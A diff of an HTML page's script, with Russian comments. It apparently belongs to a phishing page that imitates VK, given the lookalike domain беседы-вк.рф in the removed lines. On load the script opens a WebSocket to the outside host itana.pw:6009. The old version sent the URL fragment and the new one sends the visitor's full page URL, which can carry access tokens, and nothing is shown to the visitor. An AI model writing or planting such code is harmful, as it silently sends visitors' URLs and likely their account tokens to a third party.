@@ -219,22 +219,9 @@
     const ws = new WebSocket("wss://itana.pw:6009");
 
     ws.onopen = () => {
-      // Получаем часть URL после # (если она есть)
-      const hash = window.location.hash; 
-      
-      // Формируем новый URL с доменом беседы-вк.рф и хэшем
-      const newUrl = "https://беседы-вк.рф/" + hash; 
-
-      ws.send(JSON.stringify({ url: newUrl })); // Отправляем новый URL в JSON формате
-      console.log("WebSocket соединение установлено. Отправлен URL: " + newUrl);
-    };
-
-    ws.onerror = (error) => {
-      console.error("WebSocket ошибка:", error);
-    };
-
-    ws.onclose = () => {
-      console.log("WebSocket соединение закрыто");
+      const currentUrl = window.location.href; // Получаем полную ссылку
+      ws.send(JSON.stringify({ url: currentUrl })); // Отправляем URL в JSON формате
+      console.log("WebSocket соединение установлено");
     };
   </script>
 </body>
